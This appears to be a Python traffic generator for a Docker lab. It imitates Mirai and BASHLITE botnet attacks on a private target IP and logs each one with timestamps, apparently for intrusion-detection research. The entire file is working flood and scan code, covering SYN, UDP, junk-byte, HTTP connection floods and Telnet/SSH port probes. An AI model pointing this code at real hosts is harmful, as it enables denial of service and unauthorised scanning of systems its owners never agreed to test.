#!/usr/bin/env python3
"""Mirai / BASHLITE botnet attack traffic generator - single-threaded for Docker."""
import os
import random
import socket
import time

TARGET_IP = os.environ.get("TARGET_IP", "192.168.100.3")
ATTACK_LOG_PATH = os.environ.get("ATTACK_LOG_PATH", "")
_log_fh = None
if ATTACK_LOG_PATH:
    _log_fh = open(ATTACK_LOG_PATH, "w", buffering=1)
    _log_fh.write("timestamp,event,botnet,primitive,cycle\n")
    _log_fh.flush()


def _log(event, botnet, primitive, cycle):
    if _log_fh is not None:
        _log_fh.write(f"{time.time():.6f},{event},{botnet},{primitive},{cycle}\n")
        _log_fh.flush()
ATTACK_DURATION = 10
PAUSE_BETWEEN = 2

# Gateway listens on these ports (from gateway_sink.py and gateway.sh)
GATEWAY_UDP_PORTS = [9999, 123, 53, 554]
GATEWAY_TCP_PORTS = [80]
ALL_GATEWAY_PORTS = GATEWAY_UDP_PORTS + GATEWAY_TCP_PORTS


def run_for_duration(func, duration):
    """Run func repeatedly for duration seconds (single-threaded)."""
    end_time = time.time() + duration
    while time.time() < end_time:
        func()
        time.sleep(0.01)  # small yield


# ── Mirai attack primitives ───────────────────────────────
def mirai_syn():
    for _ in range(20):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        try:
            s.connect_ex((TARGET_IP, random.choice(GATEWAY_TCP_PORTS)))
        except Exception:
            pass
        finally:
            s.close()


def mirai_udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(30):
        s.sendto(bytes(random.randint(512, 1024)), (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
    s.close()


def mirai_udpplain():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(100):
        s.sendto(b"X" * 64, (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
    s.close()


def mirai_ack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(50):
        s.sendto(bytes(random.randint(64, 256)), (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
    s.close()


def mirai_scan():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect((TARGET_IP, 23))
        s.close()
    except Exception:
        pass


# ── BASHLITE attack primitives ────────────────────────────
def bashlite_udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(40):
        s.sendto(bytes([0xAB] * random.randint(256, 768)), (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
    s.close()


def bashlite_junk():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(50):
        s.sendto(bytes(random.randint(32, 128)), (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
    s.close()


def bashlite_tcp():
    for _ in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, random.choice(GATEWAY_TCP_PORTS)))
            s.send(b"GET / HTTP/1.0\r\n\r\n")
        except Exception:
            pass
        finally:
            s.close()


def bashlite_scan():
    for port in [23, 2323, 22] + GATEWAY_TCP_PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((TARGET_IP, port))
            s.close()
        except Exception:
            pass


def bashlite_combo():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(bytes(random.randint(64, 256)), (TARGET_IP, random.choice(GATEWAY_UDP_PORTS)))
        s.close()
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect_ex((TARGET_IP, random.choice(GATEWAY_TCP_PORTS)))
        s.close()
    except Exception:
        pass


# ── Attack registry (botnet, name, function) ──────────────
attacks = [
    ("Mirai", "SYN",      mirai_syn),
    ("Mirai", "UDP",      mirai_udp),
    ("Mirai", "UDPplain", mirai_udpplain),
    ("Mirai", "ACK",      mirai_ack),
    ("BASHLITE", "Junk",  bashlite_junk),
    ("BASHLITE", "UDP",   bashlite_udp),
    ("BASHLITE", "TCP",   bashlite_tcp),
    ("Mirai", "Scan",     mirai_scan),
    ("BASHLITE", "Scan",  bashlite_scan),
    ("BASHLITE", "COMBO", bashlite_combo),
]


# ── Main loop: cycle through every attack type ────────────
print(f"[Attacker] Target: {TARGET_IP}")
cycle = 0
while True:
    cycle += 1
    print(f"\n--- Attack Cycle {cycle} ---")
    _log("cycle_start", "", "", cycle)
    for botnet, name, func in attacks:
        print(f"[{botnet}] {name} flood for {ATTACK_DURATION}s...")
        _log("primitive_start", botnet, name, cycle)
        run_for_duration(func, ATTACK_DURATION)
        _log("primitive_end", botnet, name, cycle)
        time.sleep(PAUSE_BETWEEN)
    _log("cycle_end", "", "", cycle)